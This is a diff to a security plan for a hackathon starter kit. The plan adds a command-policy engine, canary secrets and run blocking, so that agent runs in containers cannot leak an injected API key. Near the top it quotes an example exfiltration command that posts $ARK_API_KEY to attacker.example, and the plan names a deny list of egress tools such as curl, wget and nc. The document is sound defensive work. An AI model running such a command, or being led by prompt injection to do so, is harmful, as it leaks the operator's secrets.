@@ -18,7 +18,7 @@
 CodeJam's Starter Kit gives every Agent Run a disposable container with real
 shell access and a real secret (`ARK_API_KEY`) injected as an environment
 variable, plus unrestricted outbound networking
-(`apps/server/src/runners/container-codex-runner.ts:57-72`, `--network bridge`).
+(`apps/server/src/container-codex-runner.ts:57-72`, `--network bridge`).
 Nothing today stops a malicious or prompt-injected task from running
 something like:
 
@@ -26,7 +26,8 @@ something like:
 curl https://attacker.example/collect -d "$ARK_API_KEY"
 ```
 
-The hackathon's **Kill Switch** track (`docs/HACKATHON_EXTENSION_GUIDE.md`)
+The starter kit's **Kill Switch** track (`docs/HACKATHON_EXTENSION_GUIDE.md`)
+— the challenge brief frames the same area as *Threat Modeling and Safety* —
 requires a threat-specific control beyond the existing CPU/memory/PID/cap-drop
 defaults, that can block or terminate a malicious Run, leave the protected
 asset unchanged, clean up, and let a safe task run afterward. This plan adds
@@ -98,7 +99,7 @@ would fully close this gap regardless of event timing is network-level
 egress control, deliberately deferred (see the alternatives note above) in
 favor of the portable, pure-application-layer approach.
 
-### 2. New types (`apps/server/src/core/types.ts`)
+### 2. New types (`apps/server/src/types.ts`)
 
 - `RunStatus`: add `"blocked"` alongside the existing
   `queued|running|completed|failed|cancelled` (`types.ts:33-44`).
@@ -107,7 +108,7 @@ favor of the portable, pure-application-layer approach.
 - `Database`: add `policyEvents: PolicyDecision[]` array
   (alongside `agents`/`messages`/`runs`, `types.ts:46-51`).
 
-### 3. Policy engine (`apps/server/src/middleware/command-policy.ts`, new file)
+### 3. Policy engine (`apps/server/src/command-policy.ts`, new file)
 
 - `evaluateCommand(command: string): { allow: boolean; rule?: string; detail?: string }`
 - Deny rules, checked in order: network egress tools (`curl`, `wget`, `nc`,
@@ -149,7 +150,7 @@ favor of the portable, pure-application-layer approach.
   should remain usable — this is a deliberate choice to demonstrate
   "run a safe task after containment").
 
-### 6. Canary secret seeding (`apps/server/src/core/workspace.ts`)
+### 6. Canary secret seeding (`apps/server/src/workspace.ts`)
 
 - In `WorkspaceManager.create` (`workspace.ts:17-36`), alongside the
   existing `.gitignore`/`README.md` writes, add one more `writeFile` for
@@ -223,13 +224,13 @@ Rehearse the 3-minute demo.
 
 ## Files touched
 
-- `apps/server/src/core/types.ts` — `RunStatus`, `PolicyDecision`, `Database.policyEvents`
-- `apps/server/src/core/errors.ts` — `PolicyViolationError`
-- `apps/server/src/middleware/command-policy.ts` — new, the policy engine
-- `apps/server/src/runners/codex-runner.ts`, `container-codex-runner.ts` — event hook + termination trigger
-- `apps/server/src/core/agent-service.ts` — `executeRun` catch branch, new `getPolicyEvents` method
-- `apps/server/src/core/workspace.ts` — canary secret seeding
-- `apps/server/src/core/app.ts` — new route
+- `apps/server/src/types.ts` — `RunStatus`, `PolicyDecision`, `Database.policyEvents`
+- `apps/server/src/errors.ts` — `PolicyViolationError`
+- `apps/server/src/command-policy.ts` — new, the policy engine
+- `apps/server/src/codex-runner.ts`, `container-codex-runner.ts` — event hook + termination trigger
+- `apps/server/src/agent-service.ts` — `executeRun` catch branch, new `getPolicyEvents` method
+- `apps/server/src/workspace.ts` — canary secret seeding
+- `apps/server/src/app.ts` — new route
 - `apps/web/src/App.tsx`, `apps/web/src/api.ts`, `apps/web/src/types.ts` — blocked-run banner, policy-events panel
 - `scripts/` — mock attacker listener for demo/tests
 - New `*.test.ts` files alongside each modified server file, following existing co-location convention
